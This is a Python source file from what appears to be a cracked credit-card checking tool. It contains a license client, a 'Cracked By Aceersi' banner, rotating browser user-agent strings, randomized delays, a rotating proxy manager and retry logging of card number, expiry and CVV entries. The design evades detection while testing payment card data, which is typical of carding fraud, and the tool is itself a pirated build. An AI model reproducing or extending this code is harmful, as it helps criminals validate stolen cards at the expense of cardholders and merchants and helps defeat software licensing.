                    if self._on_status_callback and result.license_info:
                        self._on_status_callback(result.license_info)
                    _audit_log('REALTIME_VERIFY', device_id=self.device_id, license_key=self.license_key, event_type='success', result='success', message=f'version={server_version}, interval={self._current_interval:.1f}s')
                else:
                    self._last_verified = datetime.now(_TZ_UTC)
                    self._consecutive_failures += 1
                    self._increase_interval()
                    if result.event_type in LICENSE_INVALID_EVENTS:
                        _audit_log('REALTIME_INVALID', device_id=self.device_id, license_key=self.license_key, event_type=result.event_type, result='triggered', message=result.error_message or 'Invalid')
                        self._trigger_invalidation(result.event_type, result.error_title or 'License Invalid', result.error_message or 'License status changed')
                        break
                    if self._consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
                        _audit_log('REALTIME_MAX_FAILURES', device_id=self.device_id, license_key=self.license_key, result='max_failures', message=f'Consecutive failures: {self._consecutive_failures}')
            except Exception as e:
                self._consecutive_failures += 1
                self._increase_interval()
                _audit_log('REALTIME_ERROR', device_id=self.device_id, license_key=self.license_key, result='exception', message=str(e))

    def _status_check_loop(self) -> None:
        while not self.stop_flag.is_set():
            time.sleep(LICENSE_CHECK_INTERVAL)
            if not self.license_key:
                continue
            try:
                result = self.verify(self.license_key)
                if not result.success:
                    if result.event_type in LICENSE_INVALID_EVENTS:
                        self._trigger_invalidation(result.event_type, result.error_title or 'License Invalid', result.error_message or 'License status changed')
                        break
                else:
                    with self._lock:
                        if result.license_info:
                            self.license_info = result.license_info
                    if self._on_status_callback and result.license_info:
                        self._on_status_callback(result.license_info)
            except Exception:
                pass

    def disconnect(self) -> None:
        _audit_log('DISCONNECT_INIT', device_id=self.device_id, license_key=self.license_key, result='initiated')
        self.stop_flag.set()
        self._registration_data = None
        self._pending_registration.clear()
        if self.sio:
            try:
                if self.sio.connected and self.license_key and self.device_id:
                    self.sio.emit('unregister_device', {'license_key': self.license_key, 'device_id': self.device_id})
                self.sio.disconnect()
            except Exception as e:
                _audit_log('DISCONNECT_ERROR', device_id=self.device_id, license_key=self.license_key, result='failed', message=str(e))
        self.socket_connected = False
        self._reset_adaptive_interval()
        self._last_server_version = 0
        self._version_stable_count = 0
        self._consecutive_failures = 0
        _audit_log('DISCONNECT_COMPLETE', device_id=self.device_id, license_key=self.license_key, result='success')

    def is_authenticated(self) -> bool:
        return self.license_info is not None and self.license_info.is_valid() and (self.license_key is not None)


    @classmethod
    def get(cls) -> Optional[LicenseInfo]:
        return cls._info

    @classmethod
    def is_authenticated(cls) -> bool:
        return cls._info is not None and cls._info.is_valid()

    @classmethod
    def get_client(cls) -> Optional[LicenseClient]:
        return cls._client

    @classmethod
    def get_user_status(cls) -> UserStatus:
        if cls._client is None:
            return UserStatus.LOGGED_OUT
        return cls._client.get_user_status()

    @classmethod
    def get_kick_reason(cls) -> Optional[str]:
        if cls._client is None:
            return None
        return cls._client.get_kick_reason()

    @classmethod
    def authenticate(cls, verify_url: str=LICENSE_VERIFY_URL, socket_url: str=LICENSE_SOCKET_URL, label: str=LICENSE_LABEL, on_invalid: Optional[Callable[[str, str, str], None]]=None, on_status: Optional[Callable[[LicenseInfo], None]]=None, on_reauth_required: Optional[Callable[[str, str, str], None]]=None, auto_protection: bool=True) -> bool:
        if cls._client is None:
            cls._client = LicenseClient(verify_url=verify_url, socket_url=socket_url, label=label)
            if on_invalid:
                cls._client.set_on_invalid(on_invalid)
            if on_status:
                cls._client.set_on_status(on_status)
            if on_reauth_required:
                cls._client.set_on_reauth_required(on_reauth_required)
                cls._reauth_callback = on_reauth_required
        cls._info = cls._client.login()
        if cls._info and auto_protection:
            cls._client.set_user_status(UserStatus.ACTIVE)
            cls._client.start_protection(enable_realtime=True)
        cls._initialized = cls._info is not None
        _audit_log('AUTHENTICATE', device_id=cls._client.device_id if cls._client else None, license_key=cls._info.key if cls._info else None, result='success' if cls._info else 'failed')
        return cls._initialized

    @classmethod
    def force_reauth(cls) -> bool:
        if cls._client is None:
            return False
        cls._client.disconnect()
        cls._client.set_user_status(UserStatus.LOGGED_OUT)
        cls._info = None
        cls._initialized = False
        cls._client = LicenseClient(verify_url=LICENSE_VERIFY_URL, socket_url=LICENSE_SOCKET_URL, label=LICENSE_LABEL)
        if cls._reauth_callback:
            callback = cls._reauth_callback

            def on_invalid(event_type: str, title: str, message: str) -> None:
                callback(event_type, title, message)
            cls._client.set_on_invalid(on_invalid)
        cls._info = cls._client.login()
        if cls._info:
            cls._client.set_user_status(UserStatus.ACTIVE)
            cls._client.start_protection(enable_realtime=True)
            cls._initialized = True
            return True
        return False

    @classmethod
    def logout(cls) -> None:
        if cls._client:
            cls._client.set_user_status(UserStatus.LOGGED_OUT)
            cls._client.disconnect()
        cls._client = None
        cls._info = None
        cls._initialized = False
        _audit_log('LOGOUT', result='success')

    @classmethod
    def clear_info(cls) -> None:
        cls._info = None
        cls._initialized = False

    @classmethod
    def check_status(cls) -> bool:
        if cls._client is None or cls._info is None:
            return False
        if not cls._info.is_valid():
            cls.logout()
            return False
        if cls._client.license_key:
            result = cls._client.verify(cls._client.license_key)
            if not result.success:
                if result.event_type in LICENSE_INVALID_EVENTS:
                    cls._client._trigger_invalidation(result.event_type, result.error_title or 'License Invalid', result.error_message or 'License status changed')
                return False
        return True

    @classmethod
    def verify(cls, license_key: str) -> VerificationResult:
        if cls._client is None:
            cls._client = LicenseClient(label=LICENSE_LABEL)
        _audit_log('VERIFY', device_id=cls._client.device_id, license_key=license_key, result='initiated')
        return cls._client.verify(license_key)

    @classmethod
    def get_realtime_state(cls) -> Optional[RealtimeLicenseState]:
        if cls._client is None:
            return None
        return cls._client.get_realtime_state()

    @classmethod
    def is_license_invalid(cls) -> bool:
        state = cls.get_realtime_state()
        if state:
            return state.needs_reauth
        return not cls.is_authenticated()

    @classmethod
    def can_relogin(cls) -> bool:
        status = cls.get_user_status()
        return status == UserStatus.KICKED

    @classmethod
    def kick_self(cls) -> None:
        if cls._client:
            cls._client._trigger_invalidation('device_kicked', 'Device Kicked', 'User triggered self-kick')
            _audit_log('KICK_SELF', result='success')


RESET = '\x1b[0m'
ANSI = {'BLACK': '\x1b[30m', 'RED': '\x1b[91m', 'GREEN': '\x1b[92m', 'YELLOW': '\x1b[93m', 'BLUE': '\x1b[94m', 'MAGENTA': '\x1b[95m', 'CYAN': '\x1b[96m', 'WHITE': '\x1b[97m', 'GRAY': '\x1b[90m'}
BLACK = getattr(Fore, 'BLACK', ANSI['BLACK'])
RED = getattr(Fore, 'RED', ANSI['RED'])
GREEN = getattr(Fore, 'GREEN', ANSI['GREEN'])
YELLOW = getattr(Fore, 'YELLOW', ANSI['YELLOW'])
BLUE = getattr(Fore, 'BLUE', ANSI['BLUE'])
MAGENTA = getattr(Fore, 'MAGENTA', ANSI['MAGENTA'])
CYAN = getattr(Fore, 'CYAN', ANSI['CYAN'])
WHITE = getattr(Fore, 'WHITE', ANSI['WHITE'])
GRAY = ANSI['GRAY']
LBLACK = getattr(Fore, 'LIGHTBLACK_EX', ANSI['GRAY'])
LRED = getattr(Fore, 'LIGHTRED_EX', ANSI['RED'])
LGREEN = getattr(Fore, 'LIGHTGREEN_EX', ANSI['GREEN'])
LYELLOW = getattr(Fore, 'LIGHTYELLOW_EX', ANSI['YELLOW'])
LBLUE = getattr(Fore, 'LIGHTBLUE_EX', ANSI['BLUE'])
LMAGENTA = getattr(Fore, 'LIGHTMAGENTA_EX', ANSI['MAGENTA'])
LCYAN = getattr(Fore, 'LIGHTCYAN_EX', ANSI['CYAN'])
LWHITE = getattr(Fore, 'LIGHTWHITE_EX', ANSI['WHITE'])
DIM = getattr(Style, 'DIM', '\x1b[2m')
NORMAL = getattr(Style, 'NORMAL', '\x1b[22m')
BRIGHT = getattr(Style, 'BRIGHT', '\x1b[1m')
RESET_ALL = getattr(Style, 'RESET_ALL', RESET)
for name in ['RED', 'GREEN', 'WHITE', 'YELLOW', 'BLACK', 'CYAN', 'BLUE', 'MAGENTA']:
    setattr(Fore, name, getattr(Fore, name, ANSI[name]))
proxy_lock = Lock()
print_lock = Lock()
file_lock = Lock()
counters = {}

def safe_print(*args, **kwargs):
    text = ' '.join((str(a) for a in args))
    end = kwargs.get('end', '\n')
    with print_lock:
        sys.stdout.write(text + end)
        sys.stdout.flush()

class HTTPClient:

    def __init__(self, timeout: int=20, use_proxy: bool=True):
        self.timeout = timeout
        self.session = self._create_session()
        if use_proxy:
            _proxy_manager.apply_to_session(self.session)

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session

    def post(self, url: str, json_data: Dict, headers: Optional[Dict]=None) -> Tuple[bool, Any]:
        try:
            response = self.session.post(url, json=json_data, headers=headers, timeout=self.timeout)
            if response.status_code == 200:
                return (True, response.json())
            error_msg = f'HTTP {response.status_code}'
            try:
                error_data = response.json()
                error_msg = error_data.get('error', error_data.get('message', error_msg))
            except json.JSONDecodeError:
                pass
            return (False, {'error': error_msg})
        except requests.exceptions.Timeout:
            return (False, {'error': 'Request timeout'})
        except requests.exceptions.ConnectionError:
            return (False, {'error': 'Connection error'})
        except Exception as e:
            return (False, {'error': str(e)})

    def close(self):
        try:
            self.session.close()
        except Exception:
            pass
RESET = RESET_ALL
GRAY = LBLACK
banner1 = f'\n\n    ⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣄⣀⠀⠀⠀⠀⠀\n    ⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀\n    ⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢿⣿⣷⡀⠀\n    ⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣴⢿⣿⣧⠀           {LCYAN} Cracked By Aceersi{LWHITE}\n    ⣿⣿⣿⣿⣿⡿⠛⣩⠍⠀⠀⠀⠐⠉⢠⣿⣿⡇      {LWHITE}github.com/Aceersi{LWHITE}\n    ⣿⡿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿        {LCYAN}@xqndrs - @xqndrs66{LWHITE}\n    ⢹⣿⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡏      -----------------------\n    ⠀⠻⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⠟⠀\n    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠟⠁⠀⠀\n\n'
banner = f"{Fore.LIGHTCYAN_EX}\n          __________________\n        .-'  \\ _.-''-._ /  '-.\n      .-/\\   .'.      .'.   /\\-.\n     _'/  \\.'   '.  .'   './  \\'_\n    :======:======::======:======:\n     '. '.  \\     ''     /  .' .'     {Fore.LIGHTRED_EX} Cracked By Aceersi{Fore.LIGHTCYAN_EX}\n       '. .  \\   :  :   /  . .'  {Fore.LIGHTYELLOW_EX}github.com/Aceersi{Fore.LIGHTCYAN_EX}\n         '.'  \\  '  '  /  '.'     {Fore.LIGHTRED_EX}@xqndrs - @xqndrs66{Fore.LIGHTCYAN_EX}\n           ':  \\:    :/  :'\n             '. \\    / .'\n               '.\\  /.'\n                 '\\/'\n{RESET_ALL}"
BASE_DIR = Path(__file__).resolve().parent
RESULT_DIR = Path('results')
lock = Lock()
live_counter = {}

def smooth_delay(min_delay=2, max_delay=10):
    if min_delay >= max_delay:
        raise ValueError
    base_delay = (min_delay + max_delay) / 2
    jitter_range = (max_delay - min_delay) / 2
    jitter = random.uniform(-jitter_range, jitter_range)
    delay = base_delay + jitter
    delay = max(min_delay, min(max_delay, delay))
    time.sleep(delay)
USA = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36']

def gstr(src, a, b):
    try:
        return src.split(a, 1)[1].split(b, 1)[0]
    except Exception:
        return ''
_PROXY_FILE = Path.home() / '.meduzaproxy'






class ProxyManager:
    _instance: Optional['ProxyManager'] = None
    _lock: Lock = Lock()

    def __new__(cls) -> 'ProxyManager':
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialized = False
        return cls._instance

    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        self._proxy: Optional[str] = None
        self._proxy_list: List[str] = []
        self._proxy_index: int = 0
        self._proxy_type: str = 'static'
        self._sessions: List[requests.Session] = []
        self._sessions_lock: Lock = Lock()
        self._proxy_change_event: threading.Event = threading.Event()
        self._load_from_file()

    def _load_from_file(self) -> None:
        try:
            if _PROXY_FILE.exists():
                data = json.loads(_PROXY_FILE.read_text(encoding='utf-8'))
                self._proxy = data.get('proxy') or None
                self._proxy_type = data.get('type', 'static')
                if self._proxy and self._proxy_type == 'proxy_rotation':
                    self._proxy_list = [self._proxy]
        except Exception:
            pass

    def _save_to_file(self) -> None:
        try:
            _PROXY_FILE.write_text(json.dumps({'proxy': self._proxy, 'type': self._proxy_type}, ensure_ascii=False), encoding='utf-8')
        except Exception:
            pass

    @property
    def GLOBAL_PROXY(self) -> Optional[str]:
        return self._proxy

    @property
    def GLOBAL_PROXY_LIST(self) -> List[str]:
        return self._proxy_list.copy()

    @property
    def GLOBAL_PROXY_TYPE(self) -> str:
        return self._proxy_type

    @property
    def is_active(self) -> bool:
        return self._proxy is not None

    def register_session(self, session: requests.Session) -> None:
        with self._sessions_lock:
            if session not in self._sessions:
                self._sessions.append(session)
                self._apply_proxy_to_session(session)

    def unregister_session(self, session: requests.Session) -> None:
        with self._sessions_lock:
            if session in self._sessions:
                self._sessions.remove(session)

    def create_session(self) -> requests.Session:
        session = requests.Session()
        self.register_session(session)
        return session

    def _apply_proxy_to_session(self, session: requests.Session) -> None:
        with self._lock:
            if self._proxy:
                session.proxies.clear()
                session.proxies.update({'http': self._proxy, 'https': self._proxy})
            else:
                session.proxies = {}

    def _broadcast_proxy_change(self) -> None:
        with self._sessions_lock:
            for session in self._sessions:
                try:
                    self._apply_proxy_to_session(session)
                except Exception:
                    pass
        self._proxy_change_event.set()

    def set_proxy(self, proxy: str, ptype: str='static', proxy_list: Optional[List[str]]=None) -> bool:
        validated_proxy = _normalize_proxy(proxy) if proxy else None
        if validated_proxy is None:
            self.remove_proxy()
            return False
        with self._lock:
            self._proxy = validated_proxy
            self._proxy_type = ptype
            if proxy_list:
                validated_list = [_normalize_proxy(p) for p in proxy_list if _normalize_proxy(p)]
                if not validated_list:
                    self.remove_proxy()
                    return False
                self._proxy_list = validated_list
                self._proxy_index = 0
            else:
                self._proxy_list = []
            self._save_to_file()
        self._broadcast_proxy_change()
        return True

    def remove_proxy(self) -> None:
        with self._lock:
            self._proxy = None
            self._proxy_list = []
            self._proxy_index = 0
            self._proxy_type = 'static'
            try:
                _PROXY_FILE.unlink(missing_ok=True)
            except Exception:
                pass
        self._broadcast_proxy_change()

    def get_current_proxy(self) -> Optional[str]:
        with self._lock:
            if not self._proxy:
                return None
            if not self._proxy_list:
                return self._proxy
            proxy = self._proxy_list[self._proxy_index]
            self._proxy_index = (self._proxy_index + 1) % len(self._proxy_list)
            return proxy

    def apply_to_session(self, session: requests.Session) -> None:
        self.register_session(session)
        with self._lock:
            if self._proxy:
                session.proxies.clear()
                session.proxies.update({'http': self._proxy, 'https': self._proxy})
            else:
                session.proxies = {}

    def sync_all_sessions(self) -> int:
        count = 0
        with self._sessions_lock:
            for session in self._sessions:
                try:
                    self._apply_proxy_to_session(session)
                    count += 1
                except Exception:
                    pass
        return count

    def clear_all_sessions(self) -> None:
        with self._lock:
            self._proxy = None
            self._proxy_list = []
            self._proxy_index = 0
            self._proxy_type = 'static'
        with self._sessions_lock:
            for session in self._sessions:
                try:
                    session.proxies.clear()
                except Exception:
                    pass
        try:
            _PROXY_FILE.unlink(missing_ok=True)
        except Exception:
            pass

    def get_status(self) -> dict:
        with self._lock:
            return {'active': self._proxy is not None, 'proxy': self._proxy, 'type': self._proxy_type, 'list_count': len(self._proxy_list), 'current_index': self._proxy_index, 'registered_sessions': len(self._sessions)}
_proxy_manager = ProxyManager()
SUPPORTED_SCHEMES = {'http', 'https', 'socks4', 'socks5', 'socks5h'}
_PROXY_PATTERNS = (re.compile('^(?P<user>[^:@\\s]+):(?P<password>[^@\\s]+)@(?P<host>[^:@\\s]+):(?P<port>\\d+)$'), re.compile('^(?P<host>[^:@\\s]+):(?P<port>\\d+):(?P<user>[^:@\\s]+):(?P<password>[^:\\s]+)$'), re.compile('^(?P<user>[^:@\\s]+):(?P<password>[^:\\s]+):(?P<host>[^:@\\s]+):(?P<port>\\d+)$'), re.compile('^(?P<host>[^:@\\s]+):(?P<port>\\d+)@(?P<user>[^:@\\s]+):(?P<password>[^:\\s]+)$'), re.compile('^(?P<host>[^:@\\s]+):(?P<port>\\d+)$'))

def _fmt_host(host: str) -> str:
    host = host.strip()
    if ':' in host and (not host.startswith('[')):
        return f'[{host}]'
    return host

def _safe_encode(s: str) -> str:
    s = s.strip()
    if '%' in s and re.search('%[0-9A-Fa-f]{2}', s):
        return s
    return quote(s, safe='')

def _normalize_proxy(raw: str) -> Optional[str]:
    if not raw:
        return None
    raw = raw.strip()
    if not raw:
        return None
    if '://' in raw:
        split = urlsplit(raw)
        scheme = (split.scheme or '').lower().strip()
        if scheme not in SUPPORTED_SCHEMES:
            return None
        host = split.hostname
        port = split.port
        user = split.username
        password = split.password
        if not host or not port:
            return None
        host = _fmt_host(host)
        if user is not None and password is not None:
            u = _safe_encode(user)
            p = _safe_encode(password)
            return f'{scheme}://{u}:{p}@{host}:{port}'
        if user is None and password is None:
            return f'{scheme}://{host}:{port}'
        return None
    for pat in _PROXY_PATTERNS:
        m = pat.fullmatch(raw)
        if not m:
            continue
        d = m.groupdict()
        host = d.get('host')
        port = d.get('port')
        user = d.get('user')
        password = d.get('password')
        if not host or not port or (not port.isdigit()):
            return None
        host = _fmt_host(host)
        default_scheme = 'http'
        if user is not None and password is not None:
            u = _safe_encode(user.strip())
            p = _safe_encode(password.strip())
            return f'{default_scheme}://{u}:{p}@{host}:{port}'
        return f'{default_scheme}://{host}:{port}'
    return None

def _get_next_proxy() -> Optional[str]:
    return _proxy_manager.get_current_proxy()

def _apply_proxy(ses: requests.Session, proxy: Optional[str]) -> None:
    _proxy_manager.apply_to_session(ses)

def _save_proxy(proxy: str, ptype: str) -> None:
    pass
_proxy_manager._load_from_file()

def _handle_retry(cc, mm, yy, cvv, exc: Exception, attempt: int) -> bool:
    exc_name = type(exc).__name__
    retry_msg = {'ProxyError': 'Proxy unavailable. Retrying...', 'SSLError': 'SSL handshake failed. Retrying...', 'ConnectionError': 'Network timeout. Retrying...', 'Timeout': 'Network timeout. Retrying...', 'socket.timeout': 'Network timeout. Retrying...', 'HTTPError': 'HTTP error. Retrying...', 'TooManyRedirects': 'Redirect loop detected. Retrying...', 'ChunkedEncodingError': 'Corrupted server response. Retrying...', 'ContentDecodingError': 'Corrupted server response. Retrying...', 'RequestException': 'Request failed. Retrying...'}.get(exc_name, 'Request failed. Retrying...')
    max_retry_msg = {'ProxyError': 'Max retry reached (Proxy unavailable).', 'SSLError': 'Max retry reached (SSL handshake failed).', 'ConnectionError': 'Max retry reached (Network timeout).', 'Timeout': 'Max retry reached (Network timeout).', 'socket.timeout': 'Max retry reached (Network timeout).', 'HTTPError': 'Max retry reached (HTTP error).', 'TooManyRedirects': 'Max retry reached (Redirect loop).', 'ChunkedEncodingError': 'Max retry reached (Corrupted response).', 'ContentDecodingError': 'Max retry reached (Corrupted response).', 'RequestException': 'Max retry reached.'}.get(exc_name, 'Max retry reached.')
    if attempt == 4:
        log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}ERROR {LWHITE}--> {LMAGENTA}{max_retry_msg}{RESET_ALL}')
        return False
    log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}RETRY {LWHITE}--> {LMAGENTA}{retry_msg}{RESET_ALL}')
    time.sleep(random.uniform(4, 20))
    return True

def _get_global_proxy() -> Optional[str]:
    return _proxy_manager.GLOBAL_PROXY

def _get_global_proxy_type() -> str:
    return _proxy_manager.GLOBAL_PROXY_TYPE

def _get_global_proxy_list() -> List[str]:
    return _proxy_manager.GLOBAL_PROXY_LIST
ANSI_RE = re.compile('\\x1b\\[[0-9;]*m')

def ansi_len(text: str) -> int:
    return len(ANSI_RE.sub('', text))

def ansi_ljust(text: str, width: int) -> str:
    return text + ' ' * max(0, width - ansi_len(text))

def _clear_line():
    sys.stdout.write('\r\x1b[K')
    sys.stdout.flush()

def _print_box(lines: List[str], width: int=66) -> None:
    inner = width - 2
    print(f"  {LCYAN}┌{'─' * inner}┐{RESET_ALL}")
    for line in lines:
        pad = inner - ansi_len(line)
        left = pad // 2
        right = pad - left
        print(f"  {LCYAN}│{RESET_ALL}{' ' * left}{line}{' ' * right}{LCYAN}│{RESET_ALL}")
    print(f"  {LCYAN}└{'─' * inner}┘{RESET_ALL}")

def _print_header(title: str, subtitle: str='') -> None:
    os.system('cls' if os.name == 'nt' else 'clear')
    safe_print(3)
    print(f"  {LCYAN}╔{'═' * 62}╗{RESET_ALL}")
    print(f'  {LCYAN}║{RESET_ALL}{BRIGHT}{CYAN}  {title:<60}{RESET_ALL}{LCYAN}║{RESET_ALL}')
    if subtitle:
        print(f'  {LCYAN}║{RESET_ALL}{DIM}{GRAY}  {subtitle:<60}{RESET_ALL}{LCYAN}║{RESET_ALL}')
    print(f"  {LCYAN}╚{'═' * 62}╝{RESET_ALL}")
    print()

def _print_status_bar() -> None:
    proxy_status = _proxy_manager.get_status()
    if proxy_status['active']:
        max_proxy_len = 42
        proxy_addr = proxy_status['proxy']
        if len(proxy_addr) > max_proxy_len:
            proxy_addr = proxy_addr[:max_proxy_len] + '...'
        proxy_line = f"{LGREEN}●{RESET_ALL} Proxy: {LGREEN}Active{RESET_ALL} ({proxy_status['type']}) | {proxy_addr}"
    else:
        proxy_line = f'{LRED}○{RESET_ALL} Proxy: {LRED}Inactive{RESET_ALL} | Direct Connection'
    INNER = 62
    print(f"  {LCYAN}┌{'─' * INNER}┐{RESET_ALL}")
    print(f'  {LCYAN}│{RESET_ALL} {ansi_ljust(proxy_line, INNER - 2)} {LCYAN}│{RESET_ALL}')
